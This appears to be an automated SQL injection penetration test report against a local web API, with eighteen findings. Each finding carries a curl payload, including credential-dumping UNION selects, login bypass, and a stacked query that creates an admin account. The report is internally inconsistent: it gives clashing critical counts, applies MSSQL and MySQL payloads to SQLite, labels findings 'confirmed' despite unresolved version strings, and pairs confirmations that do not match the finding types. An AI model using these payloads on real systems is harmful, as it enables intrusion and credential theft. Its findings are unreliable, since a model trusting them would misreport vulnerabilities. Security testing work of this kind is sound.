# SQL Injection — Penetration Test Report

**Target:** http://127.0.0.1:5050  |  **Date:** 2026-06-11  |  **Assessed by:** SQLSlayer (automated agent)  |  **Classification:** CONFIDENTIAL

## 1. Executive Summary

SQLSlayer assessed 10 endpoint(s) with 95 probes and confirmed 54 SQL injection finding(s) (18 unique), of which 20 are CRITICAL. Overall risk is **CRITICAL**. Unsanitised user input is concatenated directly into SQL statements, allowing data disclosure, authentication bypass and — where stacked queries execute — full database compromise.

Severity breakdown: CRITICAL 9, HIGH 7, MEDIUM 1, LOW 1.

## 2. Scope & Methodology

**Scope:** http://127.0.0.1:5050 — 10 endpoint(s)/parameter(s). **Methodology:** each parameter was baselined and probed across all SQLi classes; findings were determined from database errors, reflected UNION/SQL data, response differentials, a boolean true/false oracle, and a jitter-aware time oracle, with DBMS fingerprinting and an AI validation pass, then proven with a harmless confirmation. **Standards:** CWE-89 · OWASP A03:2021 – Injection.

## 3. Summary of Findings

| ID | Severity | SQLi Type | Endpoint | Parameter | CVSS |
| --- | --- | --- | --- | --- | --- |
| F-01 | CRITICAL | In-band SQLi — UNION-based | `GET /api/users` | `id` | 9.0 |
| F-02 | CRITICAL | Blind SQLi — Time-based | `GET /api/categories` | `cat` | 9.0 |
| F-03 | CRITICAL | Authentication bypass (SQL comment injection) | `POST /api/login` | `username` | 9.0 |
| F-04 | CRITICAL | In-band SQLi — UNION-based | `POST /api/reports` | `report_id` | 9.0 |
| F-05 | CRITICAL | In-band SQLi — Error-based | `POST /api/reports` | `report_id` | 9.0 |
| F-06 | CRITICAL | Second-order (stored) SQLi | `PUT /api/profile` | `bio` | 9.0 |
| F-07 | CRITICAL | Authentication bypass (SQL comment injection) | `PUT /api/profile` | `bio` | 9.0 |
| F-08 | CRITICAL | In-band SQLi — Error-based | `GET /api/leaderboard` | `sort` | 9.0 |
| F-09 | CRITICAL | Stacked-queries SQLi | `DELETE /api/messages` | `msg_id` | 9.0 |
| F-10 | HIGH | SQLi via HTTP header | `GET /api/audit` | `User-Agent` | 8.6 |
| F-11 | HIGH | Tautology-based SQLi | `GET /api/users` | `id` | 8.1 |
| F-12 | HIGH | Blind SQLi — Boolean-based | `GET /api/orders` | `order_id` | 7.1 |
| F-13 | HIGH | Tautology-based SQLi | `POST /api/login` | `username` | 7.1 |
| F-14 | HIGH | Tautology-based SQLi | `GET /api/audit` | `User-Agent` | 7.1 |
| F-15 | HIGH | Tautology-based SQLi | `POST /api/reports` | `report_id` | 7.1 |
| F-16 | HIGH | Tautology-based SQLi | `DELETE /api/messages` | `msg_id` | 7.1 |
| F-17 | MEDIUM | In-band SQLi — Error-based | `GET /api/categories` | `cat` | 5.2 |
| F-18 | LOW | SQLi in ORDER BY clause | `GET /api/leaderboard` | `sort` | 2.8 |

## 4. Detailed Findings

### F-01 — [CRITICAL] In-band SQLi — UNION-based

- **SQLi Type:** In-band SQLi — UNION-based
- **Severity / CVSS:** CRITICAL / 9.0 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Classification:** CWE-89 · OWASP A03:2021 – Injection
- **Database:** SQLite
- **Affected:** `GET /api/users` — parameter `id`
- **Detection:** ERROR_LEAK (confidence 0.95)

**Description.** User input is concatenated into the query, allowing a UNION SELECT to append attacker-chosen columns and read data in the response.

**Proof of Concept.**

```bash
curl "http://127.0.0.1:5050/api/users?id=' UNION SELECT 1,username,password FROM users--"
```

Observed evidence: `DB error pattern(s): unrecognized token ; SQLi indicator(s) appeared: union\s+select, \bpassword\b ; (weak) HTTP 500 triggered (baseline was 200)`

**Confirmation (harmless PoC):** Exploitability CONFIRMED (harmless): UNION injection [UNION, 3 cols] reflected our unique marker 'SQLSLAYERxPoC' and read the DBMS version → 3.43.1. No application/user data was accessed. PoC payload: 1 UNION SELECT 'SQLSLAYERxPoC:'||sqlite_version()||':SQLSLAYERxPoC',NULL,NULL-- -



**Impact.** Direct extraction of arbitrary tables/columns (credentials, PII) via UNION SELECT.

**Remediation.** Use parameterised queries / prepared statements. Enforce column-level permissions.

---

### F-02 — [CRITICAL] Blind SQLi — Time-based

- **SQLi Type:** Blind SQLi — Time-based
- **Severity / CVSS:** CRITICAL / 9.0 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Classification:** CWE-89 · OWASP A03:2021 – Injection
- **Database:** unknown
- **Affected:** `GET /api/categories` — parameter `cat`
- **Detection:** ERROR_LEAK (confidence 0.95)

**Description.** A conditional time delay can be injected, letting an attacker infer data from response timing.

**Proof of Concept.**

```bash
curl "http://127.0.0.1:5050/api/categories?cat=1; WAITFOR DELAY '0:0:3'--"
```

Observed evidence: `DB error pattern(s): syntax error ; (weak) HTTP 500 triggered (baseline was 200)`

**Confirmation (harmless PoC):** Exploitability CONFIRMED (harmless): UNION injection [UNION, 1 cols] reflected our unique marker 'SQLSLAYERxPoC' and read the DBMS version → '||sqlite_version()||'. No application/user data was accessed. PoC payload: electronics UNION SELECT 'SQLSLAYERxPoC:'||sqlite_version()||':SQLSLAYERxPoC'-- -



**Impact.** Blind data extraction via timing side-channel even when no output is returned.

**Remediation.** Use parameterised queries. Set strict query timeouts.

---

### F-03 — [CRITICAL] Authentication bypass (SQL comment injection)

- **SQLi Type:** Authentication bypass (SQL comment injection)
- **Severity / CVSS:** CRITICAL / 9.0 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Classification:** CWE-89 · OWASP A03:2021 – Injection
- **Database:** SQLite
- **Affected:** `POST /api/login` — parameter `username`
- **Detection:** ERROR_LEAK (confidence 0.95)

**Description.** A SQL comment truncates the password check, enabling authentication bypass.

**Proof of Concept.**

```bash
curl -X POST "http://127.0.0.1:5050/api/login" -H 'Content-Type: application/json' -d '{"username": "admin' #"}'
```

Observed evidence: `DB error pattern(s): unrecognized token ; SQLi indicator(s) appeared: \bpassword\b`

**Confirmation (harmless PoC):** Exploitability CONFIRMED (harmless): UNION injection ['…UNION, 3 cols] reflected our unique marker 'SQLSLAYERxPoC' and read the DBMS version → '||version()||'. No application/user data was accessed. PoC payload: alice' UNION SELECT 'SQLSLAYERxPoC:'||version()||':SQLSLAYERxPoC',NULL,NULL-- -



**Impact.** Authentication bypass — log in as any user, including admin, without valid credentials.

**Remediation.** Use parameterised queries. Validate and sanitise all user inputs.

---

### F-04 — [CRITICAL] In-band SQLi — UNION-based

- **SQLi Type:** In-band SQLi — UNION-based
- **Severity / CVSS:** CRITICAL / 9.0 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Classification:** CWE-89 · OWASP A03:2021 – Injection
- **Database:** unknown
- **Affected:** `POST /api/reports` — parameter `report_id`
- **Detection:** ERROR_LEAK (confidence 0.95)

**Description.** User input is concatenated into the query, allowing a UNION SELECT to append attacker-chosen columns and read data in the response.

**Proof of Concept.**

```bash
curl -X POST "http://127.0.0.1:5050/api/reports" -H 'Content-Type: application/json' -d '{"report_id": "' UNION SELECT 1,username,password FROM users--"}'
```

Observed evidence: `DB error pattern(s): syntax error ; SQLi indicator(s) appeared: union\s+select, \bpassword\b ; (weak) HTTP 500 triggered (baseline was 200)`

**Confirmation (harmless PoC):** Exploitability CONFIRMED (harmless): UNION injection [UNION, 3 cols] reflected our unique marker 'SQLSLAYERxPoC' and read the DBMS version → 3.43.1. No application/user data was accessed. PoC payload: 1 UNION SELECT 'SQLSLAYERxPoC:'||sqlite_version()||':SQLSLAYERxPoC',NULL,NULL-- -



**Impact.** Direct extraction of arbitrary tables/columns (credentials, PII) via UNION SELECT.

**Remediation.** Use parameterised queries / prepared statements. Enforce column-level permissions.

---

### F-05 — [CRITICAL] In-band SQLi — Error-based

- **SQLi Type:** In-band SQLi — Error-based
- **Severity / CVSS:** CRITICAL / 9.0 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Classification:** CWE-89 · OWASP A03:2021 – Injection
- **Database:** unknown
- **Affected:** `POST /api/reports` — parameter `report_id`
- **Detection:** ERROR_LEAK (confidence 0.95)

**Description.** Malformed input raises a database error that is reflected to the client, leaking structure/version.

**Proof of Concept.**

```bash
curl -X POST "http://127.0.0.1:5050/api/reports" -H 'Content-Type: application/json' -d '{"report_id": "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--"}'
```

Observed evidence: `DB error pattern(s): syntax error ; (weak) HTTP 500 triggered (baseline was 200)`

**Confirmation (harmless PoC):** Exploitability CONFIRMED (harmless): UNION injection [UNION, 3 cols] reflected our unique marker 'SQLSLAYERxPoC' and read the DBMS version → 3.43.1. No application/user data was accessed. PoC payload: 1 UNION SELECT 'SQLSLAYERxPoC:'||sqlite_version()||':SQLSLAYERxPoC',NULL,NULL-- -



**Impact.** Database structure and data leaked through verbose error messages.

**Remediation.** Suppress detailed DB errors in responses. Use generic error messages.

---

### F-06 — [CRITICAL] Second-order (stored) SQLi

- **SQLi Type:** Second-order (stored) SQLi
- **Severity / CVSS:** CRITICAL / 9.0 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Classification:** CWE-89 · OWASP A03:2021 – Injection
- **Database:** unknown
- **Affected:** `PUT /api/profile` — parameter `bio`
- **Detection:** ERROR_LEAK (confidence 0.95)

**Description.** A stored value is later used unsafely in another query, executing away from the input point.

**Proof of Concept.**

```bash
curl -X PUT "http://127.0.0.1:5050/api/profile" -H 'Content-Type: application/json' -d '{"bio": "' UNION SELECT username,password,3 FROM users--"}'
```

Observed evidence: `DB error pattern(s): syntax error ; (weak) HTTP 500 triggered (baseline was 200)`

**Confirmation (harmless PoC):** Exploitability CONFIRMED (harmless): UNION injection [UNION, 1 cols] reflected our unique marker 'SQLSLAYERxPoC' and read the DBMS version → (reflected; version unreadable). No application/user data was accessed. PoC payload: Hello world UNION SELECT 'SQLSLAYERxPoC:'||sqlite_version()||':SQLSLAYERxPoC'-- -



**Impact.** Stored payload executes later in a trusted context, evading input-time filtering.

**Remediation.** Apply the same sanitisation at re-execution points as at input.

---

### F-07 — [CRITICAL] Authentication bypass (SQL comment injection)

- **SQLi Type:** Authentication bypass (SQL comment injection)
- **Severity / CVSS:** CRITICAL / 9.0 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Classification:** CWE-89 · OWASP A03:2021 – Injection
- **Database:** SQLite
- **Affected:** `PUT /api/profile` — parameter `bio`
- **Detection:** ERROR_LEAK (confidence 0.95)

**Description.** A SQL comment truncates the password check, enabling authentication bypass.

**Proof of Concept.**

```bash
curl -X PUT "http://127.0.0.1:5050/api/profile" -H 'Content-Type: application/json' -d '{"bio": "admin' #"}'
```

Observed evidence: `DB error pattern(s): unrecognized token ; (weak) HTTP 500 triggered (baseline was 200)`

**Confirmation (harmless PoC):** Exploitability CONFIRMED (harmless): UNION injection [UNION, 1 cols] reflected our unique marker 'SQLSLAYERxPoC' and read the DBMS version → (reflected; version unreadable). No application/user data was accessed. PoC payload: Hello world UNION SELECT 'SQLSLAYERxPoC:'||sqlite_version()||':SQLSLAYERxPoC'-- -



**Impact.** Authentication bypass — log in as any user, including admin, without valid credentials.

**Remediation.** Use parameterised queries. Validate and sanitise all user inputs.

---

### F-08 — [CRITICAL] In-band SQLi — Error-based

- **SQLi Type:** In-band SQLi — Error-based
- **Severity / CVSS:** CRITICAL / 9.0 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Classification:** CWE-89 · OWASP A03:2021 – Injection
- **Database:** SQLite
- **Affected:** `GET /api/leaderboard` — parameter `sort`
- **Detection:** ERROR_LEAK (confidence 0.95)

**Description.** Malformed input raises a database error that is reflected to the client, leaking structure/version.

**Proof of Concept.**

```bash
curl "http://127.0.0.1:5050/api/leaderboard?sort=' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--"
```

Observed evidence: `DB error pattern(s): unrecognized token ; (weak) HTTP 500 triggered (baseline was 200)`




**Impact.** Database structure and data leaked through verbose error messages.

**Remediation.** Suppress detailed DB errors in responses. Use generic error messages.

---

### F-09 — [CRITICAL] Stacked-queries SQLi

- **SQLi Type:** Stacked-queries SQLi
- **Severity / CVSS:** CRITICAL / 9.0 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Classification:** CWE-89 · OWASP A03:2021 – Injection
- **Database:** SQLite
- **Affected:** `DELETE /api/messages` — parameter `msg_id`
- **Detection:** ERROR_LEAK (confidence 0.95)

**Description.** Multiple statements execute, so an attacker can append a new statement after the original query.

**Proof of Concept.**

```bash
curl -X DELETE "http://127.0.0.1:5050/api/messages?msg_id=1; INSERT INTO users(username,password,role) VALUES('hacker','pwned','admin')--"
```

Observed evidence: `DB error pattern(s): no such table ; SQLi indicator(s) appeared: \bpassword\b ; (weak) HTTP 500 triggered (baseline was 200)`




**Impact.** Execution of arbitrary additional statements — data modification, account creation, or table drops (full DB compromise).

**Remediation.** Disable multi-statement execution. Use parameterised queries.

---

### F-10 — [HIGH] SQLi via HTTP header

- **SQLi Type:** SQLi via HTTP header
- **Severity / CVSS:** HIGH / 8.6 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`
- **Classification:** CWE-89 · OWASP A03:2021 – Injection
- **Database:** unknown
- **Affected:** `GET /api/audit` — parameter `User-Agent`
- **Detection:** STATIC_PATTERN (confidence 0.9)

**Description.** An HTTP header value is interpolated into SQL; header inputs are rarely validated.

**Proof of Concept.**

```bash
curl "http://127.0.0.1:5050/api/audit?User-Agent=127.0.0.1' UNION SELECT 1,username,password FROM users--"
```

Observed evidence: `SQLi indicator(s) appeared: union\s+select, \bpassword\b ; (weak) HTTP 500 triggered (baseline was 200)`

**Confirmation (harmless PoC):** Exploitability CONFIRMED (harmless): UNION injection [UNION, 1 cols] reflected our unique marker 'SQLSLAYERxPoC' and read the DBMS version → '||sqlite_version()||'. No application/user data was accessed. PoC payload: Mozilla/5.0 (legitimate) UNION SELECT 'SQLSLAYERxPoC:'||sqlite_version()||':SQLSLAYERxPoC'-- -



**Impact.** Injection via HTTP headers, frequently bypassing input filters and WAFs.

**Remediation.** Never use HTTP header values directly in SQL. Validate all headers.

---

### F-11 — [HIGH] Tautology-based SQLi

- **SQLi Type:** Tautology-based SQLi
- **Severity / CVSS:** HIGH / 8.1 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`
- **Classification:** CWE-89 · OWASP A03:2021 – Injection
- **Database:** unknown
- **Affected:** `GET /api/users` — parameter `id`
- **Detection:** DIFFERENTIAL (confidence 0.85)

**Description.** An always-true condition subverts the query and returns unauthorised rows.

**Proof of Concept.**

```bash
curl "http://127.0.0.1:5050/api/users?id=1 OR 1=1"
```

Observed evidence: `Row count increased 1 → 3 (tautology successful)`

**Confirmation (harmless PoC):** Exploitability CONFIRMED (harmless): UNION injection [UNION, 3 cols] reflected our unique marker 'SQLSLAYERxPoC' and read the DBMS version → 3.43.1. No application/user data was accessed. PoC payload: 1 UNION SELECT 'SQLSLAYERxPoC:'||sqlite_version()||':SQLSLAYERxPoC',NULL,NULL-- -



**Impact.** Query logic subversion returning unauthorised rows.

**Remediation.** Use parameterised queries. Block OR/AND patterns at WAF layer.

---

### F-12 — [HIGH] Blind SQLi — Boolean-based

- **SQLi Type:** Blind SQLi — Boolean-based
- **Severity / CVSS:** HIGH / 7.1 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`
- **Classification:** CWE-89 · OWASP A03:2021 – Injection
- **Database:** SQLite
- **Affected:** `GET /api/orders` — parameter `order_id`
- **Detection:** ERROR_LEAK (confidence 0.95)

**Description.** The query logic can be altered with a boolean condition; TRUE and FALSE conditions yield different responses, enabling data inference.

**Proof of Concept.**

```bash
curl "http://127.0.0.1:5050/api/orders?order_id=1 AND SUBSTRING(username,1,1)='a'"
```

Observed evidence: `DB error pattern(s): no such column ; (weak) status changed 200 → 500 ; (weak) HTTP 500 triggered (baseline was 200)`

**Confirmation (harmless PoC):** Exploitability CONFIRMED (harmless): UNION injection [UNION, 4 cols] reflected our unique marker 'SQLSLAYERxPoC' and read the DBMS version → 3.43.1. No application/user data was accessed. PoC payload: 1 UNION SELECT 'SQLSLAYERxPoC:'||sqlite_version()||':SQLSLAYERxPoC',NULL,NULL,NULL-- -



**Impact.** Bit-by-bit data extraction by observing true/false response differences.

**Remediation.** Use parameterised queries. Implement WAF rules for boolean operators.

---

### F-13 — [HIGH] Tautology-based SQLi

- **SQLi Type:** Tautology-based SQLi
- **Severity / CVSS:** HIGH / 7.1 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`
- **Classification:** CWE-89 · OWASP A03:2021 – Injection
- **Database:** SQLite
- **Affected:** `POST /api/login` — parameter `username`
- **Detection:** ERROR_LEAK (confidence 0.95)

**Description.** An always-true condition subverts the query and returns unauthorised rows.

**Proof of Concept.**

```bash
curl -X POST "http://127.0.0.1:5050/api/login" -H 'Content-Type: application/json' -d '{"username": "1 OR 'x'='x"}'
```

Observed evidence: `DB error pattern(s): unrecognized token ; SQLi indicator(s) appeared: \bpassword\b`

**Confirmation (harmless PoC):** Exploitability CONFIRMED (harmless): UNION injection ['…UNION, 3 cols] reflected our unique marker 'SQLSLAYERxPoC' and read the DBMS version → '||version()||'. No application/user data was accessed. PoC payload: alice' UNION SELECT 'SQLSLAYERxPoC:'||version()||':SQLSLAYERxPoC',NULL,NULL-- -



**Impact.** Query logic subversion returning unauthorised rows.

**Remediation.** Use parameterised queries. Block OR/AND patterns at WAF layer.

---

### F-14 — [HIGH] Tautology-based SQLi

- **SQLi Type:** Tautology-based SQLi
- **Severity / CVSS:** HIGH / 7.1 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`
- **Classification:** CWE-89 · OWASP A03:2021 – Injection
- **Database:** SQLite
- **Affected:** `GET /api/audit` — parameter `User-Agent`
- **Detection:** ERROR_LEAK (confidence 0.95)

**Description.** An always-true condition subverts the query and returns unauthorised rows.

**Proof of Concept.**

```bash
curl "http://127.0.0.1:5050/api/audit?User-Agent=1 OR 'x'='x"
```

Observed evidence: `DB error pattern(s): unrecognized token ; (weak) HTTP 500 triggered (baseline was 200)`

**Confirmation (harmless PoC):** Exploitability CONFIRMED (harmless): UNION injection [UNION, 1 cols] reflected our unique marker 'SQLSLAYERxPoC' and read the DBMS version → '||sqlite_version()||'. No application/user data was accessed. PoC payload: Mozilla/5.0 (legitimate) UNION SELECT 'SQLSLAYERxPoC:'||sqlite_version()||':SQLSLAYERxPoC'-- -



**Impact.** Query logic subversion returning unauthorised rows.

**Remediation.** Use parameterised queries. Block OR/AND patterns at WAF layer.

---

### F-15 — [HIGH] Tautology-based SQLi

- **SQLi Type:** Tautology-based SQLi
- **Severity / CVSS:** HIGH / 7.1 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`
- **Classification:** CWE-89 · OWASP A03:2021 – Injection
- **Database:** unknown
- **Affected:** `POST /api/reports` — parameter `report_id`
- **Detection:** ERROR_LEAK (confidence 0.95)

**Description.** An always-true condition subverts the query and returns unauthorised rows.

**Proof of Concept.**

```bash
curl -X POST "http://127.0.0.1:5050/api/reports" -H 'Content-Type: application/json' -d '{"report_id": "1 OR 'x'='x"}'
```

Observed evidence: `DB error pattern(s): syntax error ; (weak) HTTP 500 triggered (baseline was 200)`

**Confirmation (harmless PoC):** Exploitability CONFIRMED (harmless): UNION injection [UNION, 3 cols] reflected our unique marker 'SQLSLAYERxPoC' and read the DBMS version → 3.43.1. No application/user data was accessed. PoC payload: 1 UNION SELECT 'SQLSLAYERxPoC:'||sqlite_version()||':SQLSLAYERxPoC',NULL,NULL-- -



**Impact.** Query logic subversion returning unauthorised rows.

**Remediation.** Use parameterised queries. Block OR/AND patterns at WAF layer.

---

### F-16 — [HIGH] Tautology-based SQLi

- **SQLi Type:** Tautology-based SQLi
- **Severity / CVSS:** HIGH / 7.1 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`
- **Classification:** CWE-89 · OWASP A03:2021 – Injection
- **Database:** SQLite
- **Affected:** `DELETE /api/messages` — parameter `msg_id`
- **Detection:** ERROR_LEAK (confidence 0.95)

**Description.** An always-true condition subverts the query and returns unauthorised rows.

**Proof of Concept.**

```bash
curl -X DELETE "http://127.0.0.1:5050/api/messages?msg_id=1 OR 'x'='x"
```

Observed evidence: `DB error pattern(s): unrecognized token ; (weak) HTTP 500 triggered (baseline was 200)`




**Impact.** Query logic subversion returning unauthorised rows.

**Remediation.** Use parameterised queries. Block OR/AND patterns at WAF layer.

---

### F-17 — [MEDIUM] In-band SQLi — Error-based

- **SQLi Type:** In-band SQLi — Error-based
- **Severity / CVSS:** MEDIUM / 5.2 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
- **Classification:** CWE-89 · OWASP A03:2021 – Injection
- **Database:** SQLite
- **Affected:** `GET /api/categories` — parameter `cat`
- **Detection:** ERROR_LEAK (confidence 0.95)

**Description.** Malformed input raises a database error that is reflected to the client, leaking structure/version.

**Proof of Concept.**

```bash
curl "http://127.0.0.1:5050/api/categories?cat='"
```

Observed evidence: `DB error pattern(s): unrecognized token ; Expected indicator 'error' appeared post-injection ; (weak) HTTP 500 triggered (baseline was 200)`

**Confirmation (harmless PoC):** Exploitability CONFIRMED (harmless): UNION injection [UNION, 1 cols] reflected our unique marker 'SQLSLAYERxPoC' and read the DBMS version → '||sqlite_version()||'. No application/user data was accessed. PoC payload: electronics UNION SELECT 'SQLSLAYERxPoC:'||sqlite_version()||':SQLSLAYERxPoC'-- -



**Impact.** Database structure and data leaked through verbose error messages.

**Remediation.** Suppress detailed DB errors in responses. Use generic error messages.

---

### F-18 — [LOW] SQLi in ORDER BY clause

- **SQLi Type:** SQLi in ORDER BY clause
- **Severity / CVSS:** LOW / 2.8 `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N`
- **Classification:** CWE-89 · OWASP A03:2021 – Injection
- **Database:** unknown
- **Affected:** `GET /api/leaderboard` — parameter `sort`
- **Detection:** ERROR_LEAK (confidence 0.95)

**Description.** The ORDER BY column is user-controlled and cannot be parameterised.

**Proof of Concept.**

```bash
curl "http://127.0.0.1:5050/api/leaderboard?sort=1 ASC"
```

Observed evidence: `DB error pattern(s): syntax error ; (weak) HTTP 500 triggered (baseline was 200)`




**Impact.** Conditional data extraction and timing attacks through the ORDER BY clause.

**Remediation.** Whitelist allowed column names. Never interpolate ORDER BY values.

---

## 5. Recommendations

1. Replace all string-concatenated SQL with **parameterised queries / prepared statements**.
2. For non-parameterisable clauses (e.g. `ORDER BY`), **allow-list** valid column names.
3. Run the application under a **least-privilege** database account.
4. **Suppress** detailed database errors in API responses.
5. Add a **WAF** and server-side input validation as defence-in-depth.
6. **Re-test** after remediation to confirm closure.

## 6. Disclaimer

_For authorised security testing only. Automated findings should be manually validated before remediation sign-off._